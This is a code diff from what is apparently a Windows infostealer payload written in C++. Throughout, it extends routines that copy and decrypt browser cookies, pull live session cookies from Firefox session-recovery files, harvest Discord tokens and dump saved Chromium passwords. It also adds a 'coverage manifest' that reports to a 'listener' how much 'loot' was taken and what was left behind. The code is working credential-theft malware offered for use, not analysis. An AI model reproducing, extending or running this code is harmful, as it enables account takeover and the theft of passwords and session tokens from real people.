@@ -326,6 +326,36 @@ static bool LooksUtf8(const char* s, int n){
     return true;
 }
 
+// ------------------------------------------------------------------ coverage manifest
+// One row per database file the payload actually opened. The listener turns
+// these into loot/coverage.jsonl: rows vs decrypted vs failed, plus a fixed
+// skip reason (missing, locked, no-key, v10-fail, unsupported, excluded).
+// Without it a 960-cookie run cannot be told from a 96%-off-the-table run.
+struct SrcRow {
+    char kind[12];
+    char browser[24];
+    char profile[64];
+    char path[512];
+    long long rows;
+    long long dec;
+    long long failed;
+    char skip[16];
+};
+static SrcRow g_src[256];
+static int g_src_n = 0;
+
+static void SrcAdd(const char* kind, const wchar_t* browser, const wchar_t* profile,
+                   const wchar_t* path, int rows, int dec, int failed, const char* skip){
+    if(g_src_n >= (int)(sizeof(g_src)/sizeof(g_src[0]))) return;
+    SrcRow* s = &g_src[g_src_n++];
+    lstrcpynA(s->kind, kind ? kind : "", sizeof(s->kind));
+    ToUtf8(browser ? browser : L"", s->browser, sizeof(s->browser));
+    ToUtf8(profile ? profile : L"", s->profile, sizeof(s->profile));
+    ToUtf8(path ? path : L"", s->path, sizeof(s->path));
+    s->rows = rows; s->dec = dec; s->failed = failed;
+    lstrcpynA(s->skip, skip ? skip : "", sizeof(s->skip));
+}
+
 // ------------------------------------------------------------------ handle hijacking
 // When a browser holds a 0-sharing lock on the cookie/password DB, CreateFileW
 // fails with error 32 (sharing violation). This function enumerates all system
@@ -599,13 +629,14 @@ static Br g_br[] = { {L"chrome",  L"\\Google\\Chrome\\User Data",           L"ch
 
 static unsigned char g_key10[32]; static bool g_has10;   // v10/v11 key (DPAPI user)
 static unsigned char g_key20[32]; static bool g_has20;   // v20 key (app-bound, pre-extracted)
+static bool g_need20;                                    // Local State declares app-bound
 
 // Parse Local State JSON to extract os_crypt.encrypted_key (v10) and app_bound_encrypted_key (v20).
 // The v20 app-bound key cannot be unwrapped in-process; cookielog.py writes it
 // per browser to C:\ProgramData\MediaCache\mc-<browser>.key (base64).
 static void LoadLocalState(const wchar_t* brname, const wchar_t* root){
     Dbg("LoadLocalState: entry");
-    g_has10 = g_has20 = false;
+    g_has10 = g_has20 = g_need20 = false;
     wchar_t ls[1024]; lstrcpyW(ls,root); lstrcatW(ls,L"\\Local State");
     HANDLE h = CreateFileW(ls,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
     if(h==INVALID_HANDLE_VALUE){ Dbg("LoadLocalState: no Local State, return"); return; }
@@ -628,6 +659,7 @@ static void LoadLocalState(const wchar_t* brname, const wchar_t* root){
     Dbg("LoadLocalState: found os_crypt");
     char* e10 = (char*)xstrstr(oc,"\"encrypted_key\"");
     char* e20 = (char*)xstrstr(oc,"\"app_bound_encrypted_key\"");
+    if(e20) g_need20 = true;
     Dbg("LoadLocalState: searched keys");
     struct { const char* tag; unsigned char* key; bool* ok; } want[2] =
         { {0,g_key10,&g_has10}, {0,g_key20,&g_has20} };
@@ -791,83 +823,333 @@ static bool DecCookie(const unsigned char* enc, int n, unsigned char* out, int* 
 }
 
 // Extract cookies from a Chromium-based browser in Cookie-Editor JSON format
-static void DumpChromium(const wchar_t* brname, const wchar_t* root, const wchar_t* exe){
-    Dbg("DumpChromium: entry");
+// One Cookies database: copy (with WAL), read, decrypt, emit records, add a
+// coverage row. profile is the directory name, or "." for a root-level store.
+static void DumpChromiumDb(const wchar_t* brname, const wchar_t* profile,
+                           const wchar_t* db, const wchar_t* exe, const char* kind){
+    wchar_t tmp_db[MAX_PATH];
+    if(!CopyDb(db,tmp_db,MAX_PATH,exe,L"cookies")){
+        Dbg("DumpChromiumDb: copy failed (browser running?)");
+        SrcAdd(kind, brname, profile, db, 0, 0, 0, "locked");
+        return;
+    }
+    char path8[1024]; ToUtf8(tmp_db,path8,sizeof(path8));
+    DbgStr("DumpChromiumDb: opening ", path8);
+    void* con=NULL; int rc=S_open(path8,&con,0x00000001/*SQLITE_OPEN_READONLY*/,NULL);
+    if(rc||!con){ SrcAdd(kind, brname, profile, db, 0, 0, 0, "locked"); return; }
+    void* st=NULL;
+    const wchar_t* SQL = L"SELECT host_key,name,path,encrypted_value,expires_utc,"
+                         L"is_secure,is_httponly,samesite FROM cookies;";
+    int prc=S_prep(con,SQL,-1,&st,NULL);
+    if(prc){ S_close(con); SrcAdd(kind, brname, profile, db, 0, 0, 0, "unsupported"); return; }
+    int rows=0, dec=0, failed=0;
+    while(S_step(st)==100){                                    // SQLITE_ROW
+        rows++;
+        RecStart();
+        FieldS0("domain",st,0); FieldS("name",st,1); FieldS("path",st,2);
+        { char b8[64]; int bl = ToUtf8(brname, b8, sizeof(b8));
+          PutS(",\"browser\":"); PutJ(b8, bl);
+          char p8[160]; int pl = ToUtf8(profile, p8, sizeof(p8));
+          PutS(",\"profile\":"); PutJ(p8, pl); }
+        const unsigned char* enc=(const unsigned char*)S_blob(st,3); int en=S_bytes(st,3);
+        const char* host_key=(const char*)S_blob(st,0);  // host_key for SHA256 domain hash verification
+        // Cookie blobs can exceed any fixed buffer (SSO/JWT session tokens reach
+        // 4-8KB+): a fixed pt[4096] overflowed the stack on the first oversized
+        // cookie and killed the payload silently. Heap buffer sized by the blob.
+        unsigned char* pt = (en > 0 && en <= 4194304)
+            ? (unsigned char*)VirtualAlloc(NULL, en, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) : NULL;
+        int pn=0;
+        if(pt && enc && DecCookie(enc,en,pt,&pn,host_key)){
+            PutS(",\"value\":"); PutJ((char*)pt,pn); dec++;
+        }
+        else { PutS(",\"value\":\"\""); failed++; }
+        if(pt) VirtualFree(pt, 0, MEM_RELEASE);
+        // expires_utc: 64-bit microseconds since 1601 -> Unix epoch
+        long long eu = S_int64(st,4);
+        long long unix = eu ? eu / 1000000 - 11644473600LL : 0;
+        PutS(",\"expirationDate\":"); PutN(unix);
+        int ss = S_int(st,7);
+        // Chromium CookieSameSite: 0=no_restriction(None), 1=Lax, 2=Strict,
+        // -1=unspecified (treated as Lax by every browser). The old mapping
+        // swapped 1 and 2 and turned every Lax cookie into Strict on import.
+        FieldStr("sameSite", ss==0 ? "None" : (ss==2 ? "Strict" : "Lax"));
+        FieldB("secure",S_int(st,5));
+        FieldB("httpOnly",S_int(st,6));
+        // hostOnly: true if domain does not start with "."
+        { const char* d=(const char*)S_blob(st,0); FieldB("hostOnly", d && d[0]!='.'); }
+        FieldB("session", unix==0);
+        PutS("}");
+    }
+    // A source that found an app-bound Local State but no key is the difference
+    // between "this profile is empty" and "we left every v20 cookie behind".
+    const char* skip = "";
+    if(g_need20 && !g_has20) skip = "no-key";
+    else if(rows > 0 && dec == 0 && failed > 0 && !g_has10) skip = "v10-fail";
+    SrcAdd(kind, brname, profile, db, rows, dec, failed, skip);
+    DbgInt("DumpChromiumDb: rows extracted", rows);
+    S_fin(st); S_close(con);
+}
+
+// Chromium family: root-level Cookies first (Opera Stable, Electron/CEF keep
+// the store at the userData root), then every profile directory.
+static void DumpChromium(const wchar_t* brname, const wchar_t* root,
+                         const wchar_t* exe, const char* kind){
+    const wchar_t* sfx[2] = {L"\\Network\\Cookies", L"\\Cookies"};
+    for(int si=0; si<2; si++){
+        wchar_t db[1024]; lstrcpyW(db,root); lstrcatW(db,sfx[si]);
+        if(GetFileAttributesW(db)!=INVALID_FILE_ATTRIBUTES)
+            DumpChromiumDb(brname, L".", db, exe, kind);
+    }
     // FindFirstFile only accepts wildcards in the LAST path component; enumerate profiles first
     wchar_t pat[1024]; lstrcpyW(pat,root); lstrcatW(pat,L"\\*");
     WIN32_FIND_DATAW fd; HANDLE f = FindFirstFileW(pat,&fd);
-    if(f==INVALID_HANDLE_VALUE){ Dbg("DumpChromium: no profiles, return"); return; }
-    Dbg("DumpChromium: found profiles, iterating");
+    if(f==INVALID_HANDLE_VALUE) return;
     do{
         if(!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
         if(fd.cFileName[0]==L'.') continue;
-        // Chrome >=88: Network\Cookies ; pre-88: Cookies directly in profile dir
-        const wchar_t* sfx[2] = {L"\\Network\\Cookies", L"\\Cookies"};
         for(int si=0; si<2; si++){
             wchar_t db[1024]; lstrcpyW(db,root); lstrcatW(db,L"\\");
             lstrcatW(db,fd.cFileName); lstrcatW(db,sfx[si]);
             if(GetFileAttributesW(db)==INVALID_FILE_ATTRIBUTES) continue;
-            wchar_t tmp_db[MAX_PATH];
-            if(!CopyDb(db,tmp_db,MAX_PATH,exe,L"cookies")){ Dbg("DumpChromium: copy failed (browser running?)"); continue; }
-            Dbg("DumpChromium: copy OK");
-            char path8[1024]; ToUtf8(tmp_db,path8,sizeof(path8));
-            DbgStr("DumpChromium: opening ", path8);
-            void* con=NULL; int rc=S_open(path8,&con,0x00000001/*SQLITE_OPEN_READONLY*/,NULL);
-            if(rc||!con){ DbgInt("DumpChromium: S_open failed", rc); continue; }
-            Dbg("DumpChromium: S_open OK");
-            void* st=NULL;
-            const wchar_t* SQL = L"SELECT host_key,name,path,encrypted_value,expires_utc,"
-                                 L"is_secure,is_httponly,samesite FROM cookies;";
-            int prc=S_prep(con,SQL,-1,&st,NULL);
-            if(prc){ DbgInt("DumpChromium: S_prep failed", prc); S_close(con); continue; }
-            Dbg("DumpChromium: S_prep OK, stepping");
-            int rows=0;
-            while(S_step(st)==100){                                    // SQLITE_ROW
-                rows++;
-                RecStart();
-                FieldS0("domain",st,0); FieldS("name",st,1); FieldS("path",st,2);
-                { char b8[64]; int bl = ToUtf8(brname, b8, sizeof(b8));
-                  PutS(",\"browser\":"); PutJ(b8, bl);
-                  char p8[160]; int pl = ToUtf8(fd.cFileName, p8, sizeof(p8));
-                  PutS(",\"profile\":"); PutJ(p8, pl); }
-                const unsigned char* enc=(const unsigned char*)S_blob(st,3); int en=S_bytes(st,3);
-                const char* host_key=(const char*)S_blob(st,0);  // host_key for SHA256 domain hash verification
-                // Cookie blobs can exceed any fixed buffer (SSO/JWT session tokens reach
-                // 4-8KB+): a fixed pt[4096] overflowed the stack on the first oversized
-                // cookie and killed the payload silently. Heap buffer sized by the blob.
-                unsigned char* pt = (en > 0 && en <= 4194304)
-                    ? (unsigned char*)VirtualAlloc(NULL, en, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) : NULL;
-                int pn=0;
-                if(pt && enc && DecCookie(enc,en,pt,&pn,host_key)){ PutS(",\"value\":"); PutJ((char*)pt,pn); }
-                else { PutS(",\"value\":\"\""); }
-                if(pt) VirtualFree(pt, 0, MEM_RELEASE);
-                // expires_utc: 64-bit microseconds since 1601 -> Unix epoch
-                long long eu = S_int64(st,4);
-                long long unix = eu ? eu / 1000000 - 11644473600LL : 0;
-                PutS(",\"expirationDate\":"); PutN(unix);
-                int ss = S_int(st,7);
-                // Chromium CookieSameSite: 0=no_restriction(None), 1=Lax, 2=Strict,
-                // -1=unspecified (treated as Lax by every browser). The old mapping
-                // swapped 1 and 2 and turned every Lax cookie into Strict on import.
-                FieldStr("sameSite", ss==0 ? "None" : (ss==2 ? "Strict" : "Lax"));
-                FieldB("secure",S_int(st,5));
-                FieldB("httpOnly",S_int(st,6));
-                // hostOnly: true if domain does not start with "."
-                { const char* d=(const char*)S_blob(st,0); FieldB("hostOnly", d && d[0]!='.'); }
-                FieldB("session", unix==0);
-                PutS("}");
-            }
-            DbgInt("DumpChromium: rows extracted", rows);
-            S_fin(st); S_close(con);
+            DumpChromiumDb(brname, fd.cFileName, db, exe, kind);
         }
     } while(FindNextFileW(f,&fd));
     FindClose(f);
 }
 
 // Extract cookies from Firefox in Cookie-Editor JSON format
-static void DumpFirefox(const wchar_t* appdata){
+// ------------------------------------------------------------------ Firefox sessionstore
+// sessionstore.jsonlz4 / sessionstore-backups\recovery.jsonlz4 hold the live
+// session cookies as mozLz4: "mozLz40\0" + u32 uncompressed size + LZ4 block.
+// Cookies.sqlite has the persisted jar; the recovery file has what the current
+// session wrote after the last flush. Both are plaintext.
+static int Lz4Block(const unsigned char* src, int slen, unsigned char* dst, int dcap){
+    int si=0, di=0;
+    while(si < slen){
+        unsigned token = src[si++];
+        int lit = (int)(token >> 4);
+        if(lit == 15){
+            int b;
+            do{ if(si>=slen) return -1; b=src[si++]; lit+=b; }while(b==255);
+        }
+        if(si+lit>slen || di+lit>dcap) return -1;
+        memcpy(dst+di, src+si, (size_t)lit); si+=lit; di+=lit;
+        if(si >= slen) break;                       // last sequence: literals only
+        if(si+2 > slen) return -1;
+        int off = (int)src[si] | ((int)src[si+1]<<8); si+=2;
+        if(off==0 || off>di) return -1;
+        int ml = (int)(token & 15);
+        if(ml == 15){
+            int b;
+            do{ if(si>=slen) return -1; b=src[si++]; ml+=b; }while(b==255);
+        }
+        ml += 4;
+        if(di+ml>dcap) return -1;
+        for(int i=0;i<ml;i++){ dst[di]=dst[di-off]; di++; }
+    }
+    return di;
+}
+
+static int ReadWholeFile(const wchar_t* path, unsigned char** out, unsigned int cap){
+    *out = NULL;
+    HANDLE h = CreateFileW(path, GENERIC_READ,
+        FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
+        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if(h == INVALID_HANDLE_VALUE) return -1;
+    LARGE_INTEGER sz;
+    if(!GetFileSizeEx(h,&sz) || sz.QuadPart<=0 || sz.QuadPart>(long long)cap){ CloseHandle(h); return -1; }
+    unsigned char* buf = (unsigned char*)VirtualAlloc(NULL,(SIZE_T)sz.QuadPart,
+                                                      MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+    if(!buf){ CloseHandle(h); return -1; }
+    DWORD got=0, total=0;
+    while(total < (DWORD)sz.QuadPart){
+        if(!ReadFile(h,buf+total,(DWORD)sz.QuadPart-total,&got,NULL) || !got) break;
+        total += got;
+    }
+    CloseHandle(h);
+    if(total != (DWORD)sz.QuadPart){ VirtualFree(buf,0,MEM_RELEASE); return -1; }
+    *out = buf;
+    return (int)total;
+}
+
+// Minimal JSON reader for the cookie objects. The payload already carries a
+// writer; this is the matching read side, not a general parser.
+static int JUnescape(const char* p, const char* end, char* out, int cap){
+    int n=0;
+    while(p<end && *p!='"'){
+        unsigned char c=(unsigned char)*p++;
+        if(c=='\\' && p<end){
+            c=(unsigned char)*p++;
+            if(c=='n') c='\n'; else if(c=='r') c='\r'; else if(c=='t') c='\t';
+            else if(c=='b') c=8; else if(c=='f') c=12;
+            else if(c=='u'){
+                unsigned v=0; int k=0;
+                while(k<4 && p<end){
+                    char h=*p++; v<<=4;
+                    if(h>='0'&&h<='9') v|=h-'0';
+                    else if(h>='a'&&h<='f') v|=h-'a'+10;
+                    else if(h>='A'&&h<='F') v|=h-'A'+10;
+                    k++;
+                }
+                if(v>=0xD800 && v<=0xDBFF && p+6<=end && p[0]=='\\' && p[1]=='u'){
+                    p+=2; unsigned lo=0; int k2=0;
+                    while(k2<4 && p<end){
+                        char h=*p++; lo<<=4;
+                        if(h>='0'&&h<='9') lo|=h-'0';
+                        else if(h>='a'&&h<='f') lo|=h-'a'+10;
+                        else if(h>='A'&&h<='F') lo|=h-'A'+10;
+                        k2++;
+                    }
+                    if(lo>=0xDC00 && lo<=0xDFFF) v=0x10000+((v-0xD800)<<10)+(lo-0xDC00);
+                }
+                if(v<0x80){ if(n<cap) out[n++]=(char)v; }
+                else if(v<0x800){ if(n+1<cap){ out[n++]=(char)(0xC0|(v>>6)); out[n++]=(char)(0x80|(v&0x3F)); } }
+                else if(v<0x10000){ if(n+2<cap){ out[n++]=(char)(0xE0|(v>>12)); out[n++]=(char)(0x80|((v>>6)&0x3F)); out[n++]=(char)(0x80|(v&0x3F)); } }
+                else { if(n+3<cap){ out[n++]=(char)(0xF0|(v>>18)); out[n++]=(char)(0x80|((v>>12)&0x3F)); out[n++]=(char)(0x80|((v>>6)&0x3F)); out[n++]=(char)(0x80|(v&0x3F)); } }
+                continue;
+            }
+        }
+        if(n<cap) out[n++]=(char)c;
+    }
+    return n;
+}
+
+static const char* JKey(const char* p, const char* end, const char* key, int klen){
+    for(; p+1+klen < end; p++){
+        if(*p!='"') continue;
+        if(memcmp(p+1,key,(size_t)klen)==0 && p[1+klen]=='"'){
+            const char* q=p+2+klen;
+            while(q<end && (*q==' '||*q=='\t'||*q=='\n'||*q=='\r')) q++;
+            if(q<end && *q==':'){ q++; while(q<end && (*q==' '||*q=='\t'||*q=='\n'||*q=='\r')) q++; return q; }
+        }
+    }
+    return NULL;
+}
+
+static int JStr(const char* obj, const char* end, const char* key, char* out, int cap){
+    out[0]=0;
+    const char* v = JKey(obj,end,key,lstrlenA(key));
+    if(!v || v>=end || *v!='"') return -1;
+    return JUnescape(v+1,end,out,cap);
+}
+
+static long long JNum(const char* obj, const char* end, const char* key, long long def){
+    const char* v = JKey(obj,end,key,lstrlenA(key));
+    if(!v || v>=end) return def;
+    long long sign=1;
+    if(*v=='-'){ sign=-1; v++; }
+    if(v>=end || *v<'0' || *v>'9') return def;
+    long long n=0;
+    while(v<end && *v>='0' && *v<='9'){ n=n*10+(*v-'0'); v++; }
+    return n*sign;
+}
+
+static int JBool(const char* obj, const char* end, const char* key, int def){
+    const char* v = JKey(obj,end,key,lstrlenA(key));
+    if(!v || v>=end) return def;
+    if(v+4<=end && memcmp(v,"true",4)==0) return 1;
+    if(v+5<=end && memcmp(v,"false",5)==0) return 0;
+    return def;
+}
+
+static const char* JObjEnd(const char* p, const char* end){
+    int depth=0; bool instr=false;
+    for(; p<end; p++){
+        char c=*p;
+        if(instr){
+            if(c=='\\'){ p++; continue; }
+            if(c=='"') instr=false;
+            continue;
+        }
+        if(c=='"') instr=true;
+        else if(c=='{') depth++;
+        else if(c=='}'){ depth--; if(depth==0) return p+1; }
+    }
+    return NULL;
+}
+
+static void DumpFirefoxSessionFile(const wchar_t* profile, const wchar_t* file){
+    unsigned char* raw=NULL;
+    int n = ReadWholeFile(file,&raw,64u<<20);
+    if(n<12 || memcmp(raw,"mozLz40\0",8)!=0){
+        if(raw) VirtualFree(raw,0,MEM_RELEASE);
+        SrcAdd("firefox",L"firefox",profile,file,0,0,0,"unsupported");
+        return;
+    }
+    unsigned int want = (unsigned)raw[8] | ((unsigned)raw[9]<<8) |
+                        ((unsigned)raw[10]<<16) | ((unsigned)raw[11]<<24);
+    if(want==0 || want>(256u<<20)){
+        VirtualFree(raw,0,MEM_RELEASE);
+        SrcAdd("firefox",L"firefox",profile,file,0,0,0,"unsupported");
+        return;
+    }
+    unsigned char* js = (unsigned char*)VirtualAlloc(NULL,want,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+    int got = js ? Lz4Block(raw+12,n-12,js,(int)want) : -1;
+    VirtualFree(raw,0,MEM_RELEASE);
+    if(got<=0){
+        if(js) VirtualFree(js,0,MEM_RELEASE);
+        SrcAdd("firefox",L"firefox",profile,file,0,0,0,"unsupported");
+        return;
+    }
+    const char* p=(const char*)js;
+    const char* end=p+got;
+    const char* arr=NULL;
+    for(const char* q=p; q+9<end; q++){
+        if(q[0]=='"' && memcmp(q+1,"cookies",7)==0 && q[8]=='"'){
+            const char* r=q+9;
+            while(r<end && *r!='[' && *r!='}') r++;
+            if(r<end && *r=='['){ arr=r+1; break; }
+        }
+    }
+    int rows=0, dec=0;
+    if(arr){
+        const char* q=arr;
+        while(q<end){
+            while(q<end && *q!=',' && *q!=']' && *q!='{') q++;
+            if(q>=end || *q==']') break;
+            if(*q!='{'){ q++; continue; }
+            const char* oe=JObjEnd(q,end);
+            if(!oe) break;
+            rows++;
+            char cname[256], cval[8192], chost[512], cpath[1024];
+            int nl=JStr(q,oe,"name",cname,sizeof(cname));
+            int vl=JStr(q,oe,"value",cval,sizeof(cval));
+            int hl=JStr(q,oe,"host",chost,sizeof(chost));
+            int pl=JStr(q,oe,"path",cpath,sizeof(cpath));
+            if(nl>0 && vl>=0 && hl>0 && pl>=0){
+                long long exp=JNum(q,oe,"expiry",0);
+                int secure=JBool(q,oe,"isSecure",0);
+                int http=JBool(q,oe,"isHttpOnly",0);
+                int ss=(int)JNum(q,oe,"sameSite",0);
+                RecStart();
+                PutS("\"name\":"); PutJ(cname,nl);
+                PutS(",\"value\":"); PutJ(cval,vl);
+                PutS(",\"domain\":"); PutJ(chost,hl);
+                PutS(",\"path\":"); PutJ(cpath,pl);
+                { char p8[160]; int pn=ToUtf8(profile,p8,sizeof(p8));
+                  PutS(",\"browser\":\"firefox\",\"profile\":"); PutJ(p8,pn); }
+                PutS(",\"expirationDate\":"); PutN(exp);
+                FieldStr("sameSite", ss==2 ? "Strict" : (ss==1 ? "Lax" : "None"));
+                FieldB("secure",secure); FieldB("httpOnly",http);
+                FieldB("hostOnly", chost[0]!='.');
+                FieldB("session", exp==0);
+                PutS("}");
+                dec++;
+            }
+            q=oe;
+        }
+    }
+    SrcAdd("firefox",L"firefox",profile,file,rows,dec,0,"");
+    VirtualFree(js,0,MEM_RELEASE);
+}
+
+static void DumpFirefox(const wchar_t* appdata, bool notice){
     wchar_t pdir[1024]; lstrcpyW(pdir,appdata); lstrcatW(pdir,L"\\Mozilla\\Firefox\\Profiles");
-    if(GetFileAttributesW(pdir)==INVALID_FILE_ATTRIBUTES){ Dbg("DumpFirefox: no Profiles dir"); return; }
+    if(GetFileAttributesW(pdir)==INVALID_FILE_ATTRIBUTES){
+        Dbg("DumpFirefox: no Profiles dir");
+        if(notice) SrcAdd("firefox",L"firefox",L".",pdir,0,0,0,"missing");
+        return;
+    }
     wchar_t pat[1024]; lstrcpyW(pat,pdir); lstrcatW(pat,L"\\*");
     WIN32_FIND_DATAW fd; HANDLE f = FindFirstFileW(pat,&fd);
     if(f==INVALID_HANDLE_VALUE){ Dbg("DumpFirefox: no profiles found"); return; }
@@ -877,40 +1159,61 @@ static void DumpFirefox(const wchar_t* appdata){
         if(fd.cFileName[0]==L'.') continue;
         wchar_t db[1024]; lstrcpyW(db,pdir); lstrcatW(db,L"\\"); lstrcatW(db,fd.cFileName);
         lstrcatW(db,L"\\cookies.sqlite");
-        if(GetFileAttributesW(db)==INVALID_FILE_ATTRIBUTES) continue;
-        wchar_t tmp_db[MAX_PATH];
-        if(!CopyDb(db,tmp_db,MAX_PATH,NULL,L"cookies")){ Dbg("DumpFirefox: copy failed"); continue; }
-        Dbg("DumpFirefox: copy OK");
-        char path8[1024]; ToUtf8(tmp_db,path8,sizeof(path8));
-        DbgStr("DumpFirefox: opening ", path8);
-        void* con=NULL; int rc=S_open(path8,&con,0x00000001/*SQLITE_OPEN_READONLY*/,NULL);
-        if(rc||!con){ DbgInt("DumpFirefox: S_open failed", rc); continue; }
-        Dbg("DumpFirefox: S_open OK");
-        void* st=NULL;
-        const wchar_t* SQL = L"SELECT name,value,host,path,expiry,isSecure,isHttpOnly,sameSite FROM moz_cookies;";
-        int prc=S_prep(con,SQL,-1,&st,NULL);
-        if(prc){ DbgInt("DumpFirefox: S_prep failed", prc); S_close(con); continue; }
-        Dbg("DumpFirefox: S_prep OK, stepping");
-        int rows=0;
-        while(S_step(st)==100){
-            rows++;
-            RecStart();
-            FieldS0("name",st,0); FieldS("value",st,1); FieldS("domain",st,2); FieldS("path",st,3);
-            { char p8[160]; int pl = ToUtf8(fd.cFileName, p8, sizeof(p8));
-              PutS(",\"browser\":\"firefox\",\"profile\":"); PutJ(p8, pl); }
-            long long expiry = S_int64(st,4);
-            PutS(",\"expirationDate\":"); PutN(expiry);
-            int ss = S_int(st,7);
-            // moz_cookies.sameSite: 0=None/no-restriction, 1=Lax, 2=Strict
-            FieldStr("sameSite", ss==2 ? "Strict" : (ss==1 ? "Lax" : "None"));
-            FieldB("secure",S_int(st,5));
-            FieldB("httpOnly",S_int(st,6));
-            { const char* d=(const char*)S_blob(st,2); FieldB("hostOnly", d && d[0]!='.'); }
-            FieldB("session", expiry==0);
-            PutS("}");
+        if(GetFileAttributesW(db)!=INVALID_FILE_ATTRIBUTES){
+            wchar_t tmp_db[MAX_PATH];
+            if(!CopyDb(db,tmp_db,MAX_PATH,NULL,L"cookies")){
+                Dbg("DumpFirefox: copy failed");
+                SrcAdd("firefox",L"firefox",fd.cFileName,db,0,0,0,"locked");
+            } else {
+                Dbg("DumpFirefox: copy OK");
+                char path8[1024]; ToUtf8(tmp_db,path8,sizeof(path8));
+                DbgStr("DumpFirefox: opening ", path8);
+                void* con=NULL; int rc=S_open(path8,&con,0x00000001/*SQLITE_OPEN_READONLY*/,NULL);
+                if(rc||!con){
+                    DbgInt("DumpFirefox: S_open failed", rc);
+                    SrcAdd("firefox",L"firefox",fd.cFileName,db,0,0,0,"locked");
+                } else {
+                    void* st=NULL;
+                    const wchar_t* SQL = L"SELECT name,value,host,path,expiry,isSecure,isHttpOnly,sameSite FROM moz_cookies;";
+                    int prc=S_prep(con,SQL,-1,&st,NULL);
+                    if(prc){
+                        DbgInt("DumpFirefox: S_prep failed", prc); S_close(con);
+                        SrcAdd("firefox",L"firefox",fd.cFileName,db,0,0,0,"unsupported");
+                    } else {
+                        int rows=0;
+                        while(S_step(st)==100){
+                            rows++;
+                            RecStart();
+                            FieldS0("name",st,0); FieldS("value",st,1); FieldS("domain",st,2); FieldS("path",st,3);
+                            { char p8[160]; int pl = ToUtf8(fd.cFileName, p8, sizeof(p8));
+                              PutS(",\"browser\":\"firefox\",\"profile\":"); PutJ(p8, pl); }
+                            long long expiry = S_int64(st,4);
+                            PutS(",\"expirationDate\":"); PutN(expiry);
+                            int ss = S_int(st,7);
+                            // moz_cookies.sameSite: 0=None/no-restriction, 1=Lax, 2=Strict
+                            FieldStr("sameSite", ss==2 ? "Strict" : (ss==1 ? "Lax" : "None"));
+                            FieldB("secure",S_int(st,5));
+                            FieldB("httpOnly",S_int(st,6));
+                            { const char* d=(const char*)S_blob(st,2); FieldB("hostOnly", d && d[0]!='.'); }
+                            FieldB("session", expiry==0);
+                            PutS("}");
+                        }
+                        DbgInt("DumpFirefox: rows extracted", rows);
+                        SrcAdd("firefox",L"firefox",fd.cFileName,db,rows,rows,0,"");
+                        S_fin(st); S_close(con);
+                    }
+                }
+            }
         }
-        DbgInt("DumpFirefox: rows extracted", rows);
-        S_fin(st); S_close(con);
+        // Session recovery: sessionstore.jsonlz4 in the profile root, recovery
+        // copy in sessionstore-backups\. One source row per file.
+        wchar_t lbl[200]; lstrcpynW(lbl,fd.cFileName,150); lstrcatW(lbl,L"-session");
+        wchar_t ss[1024];
+        lstrcpyW(ss,pdir); lstrcatW(ss,L"\\"); lstrcatW(ss,fd.cFileName); lstrcatW(ss,L"\\sessionstore.jsonlz4");
+        if(GetFileAttributesW(ss)!=INVALID_FILE_ATTRIBUTES) DumpFirefoxSessionFile(lbl,ss);
+        lstrcpyW(ss,pdir); lstrcatW(ss,L"\\"); lstrcatW(ss,fd.cFileName);
+        lstrcatW(ss,L"\\sessionstore-backups\\recovery.jsonlz4");
+        if(GetFileAttributesW(ss)!=INVALID_FILE_ATTRIBUTES) DumpFirefoxSessionFile(lbl,ss);
     } while(FindNextFileW(f,&fd));
     FindClose(f);
 }
@@ -979,10 +1282,12 @@ static void DumpDiscordTokens(const wchar_t* appdata){
                               L"\\DiscordPTB\\Local Storage\\leveldb",
                               L"\\DiscordCanary\\Local Storage\\leveldb",
                               L"\\Lightcord\\Local Storage\\leveldb" };
+    const wchar_t* lbls[] = { L"Discord", L"DiscordPTB", L"DiscordCanary", L"Lightcord" };
     const wchar_t* exts[] = { L"\\*.ldb", L"\\*.log" };
     for(int alt=0; alt<4; alt++){
         wchar_t dir[1024]; lstrcpyW(dir, appdata); lstrcatW(dir, alts[alt]);
         if(GetFileAttributesW(dir)==INVALID_FILE_ATTRIBUTES) continue;
+        int before = g_tok_n;
         for(int e=0; e<2; e++){
             wchar_t pattern[1024]; lstrcpyW(pattern, dir); lstrcatW(pattern, exts[e]);
             WIN32_FIND_DATAW fd; HANDLE f=FindFirstFileW(pattern,&fd);
@@ -1005,6 +1310,8 @@ static void DumpDiscordTokens(const wchar_t* appdata){
             } while(FindNextFileW(f,&fd));
             FindClose(f);
         }
+        int found = g_tok_n - before;
+        SrcAdd("leveldb", L"discord", lbls[alt], dir, found, found, 0, "");
     }
     DbgInt("DumpDiscordTokens: tokens found", g_tok_n);
     EmitTokens();
@@ -1014,105 +1321,128 @@ static void DumpDiscordTokens(const wchar_t* appdata){
 // ------------------------------------------------------------------ Browser saved passwords (Chromium Login Data)
 // Same AES-256-GCM encryption as cookies, same key (v10/v11/v20).
 // Path: <profile>\Login Data (SQLite: logins table)
-static void DumpPasswords(const wchar_t* name, const wchar_t* root, const wchar_t* exe){
+static void DumpPasswordDb(const wchar_t* name, const wchar_t* pname,
+                           const wchar_t* prof, const wchar_t* exe){
     Dbg("DumpPasswords: entry");
-    wchar_t prof[1024];
-    // Default + Profile 1..9: apps that create several profiles used to lose
-    // every saved login past Profile 3.
-    for(int p=0; p<10; p++){
-        wchar_t pname[32];
-        if(p==0) lstrcpyW(pname, L"Default");
-        else {
-            lstrcpyW(pname, L"Profile ");
-            wchar_t d[2]; d[0] = (wchar_t)(L'0' + p); d[1] = 0;
-            lstrcatW(pname, d);
-        }
-        lstrcpyW(prof, root); lstrcatW(prof, L"\\"); lstrcatW(prof, pname);
-        lstrcatW(prof, L"\\Login Data");
-        if(GetFileAttributesW(prof)==INVALID_FILE_ATTRIBUTES) continue;
-
-        wchar_t tmp[MAX_PATH];
-        if(!CopyDb(prof, tmp, MAX_PATH, exe, L"logins")){ Dbg("DumpPasswords: copy failed"); continue; }
-        Dbg("DumpPasswords: copy OK");
-
-        char path8[1024]; ToUtf8(tmp,path8,sizeof(path8));
-        void* con=NULL; int rc=S_open(path8,&con,0x00000001/*SQLITE_OPEN_READONLY*/,NULL);
